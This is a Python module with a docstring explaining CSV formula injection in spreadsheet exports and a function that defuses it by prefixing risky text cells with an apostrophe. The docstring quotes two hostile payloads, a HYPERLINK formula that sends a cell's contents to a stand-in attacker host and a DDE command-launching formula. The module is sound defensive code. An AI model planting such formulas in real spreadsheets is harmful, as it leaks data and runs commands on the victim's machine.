"""Make a value safe to put in a spreadsheet cell.

`csv.writer` quotes and escapes correctly, which stops a value breaking the FILE
format. It does nothing about the value being interpreted as a FORMULA when the
file is opened: a cell beginning `=`, `+`, `-`, `@`, tab or carriage return is
executed by Excel, LibreOffice and Google Sheets.

Tenant names, unit labels, expense descriptions and notes are typed in by staff,
often from documents a tenant supplied, and the exports are opened by the
landlord on his own machine. A tenant registered as

    =HYPERLINK("https://attacker.example/?d="&A1,"Click for receipt")

becomes a live link in his spreadsheet, carrying whatever is in the
neighbouring cell. `=cmd|'/c calc'!A0` is the same trick aimed at DDE.

The fix is one character: prefix the cell with an apostrophe, which every
spreadsheet reads as "this is text". The visible value is unchanged.
"""
import numbers

#: Characters that make a spreadsheet treat the cell as a formula.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value):
    """Return `value` in a form no spreadsheet will evaluate.

    Numbers (int, float, Decimal) are passed through unchanged: they are
    computed server-side, and a negative balance must stay a number or every
    sum in the sheet breaks. Only TEXT is neutralised, and only when it starts
    with a formula character — so a money figure that arrives as a string must
    not be passed through here.
    """
    if value is None:
        return ""
    if isinstance(value, numbers.Number) and not isinstance(value, bool):
        return value
    if not isinstance(value, str):
        return value
    if value.startswith(FORMULA_PREFIXES):
        return "'" + value
    return value


def csv_safe_row(row) -> list:
    """`csv_safe` across a whole row of text cells."""
    return [csv_safe(cell) for cell in row]
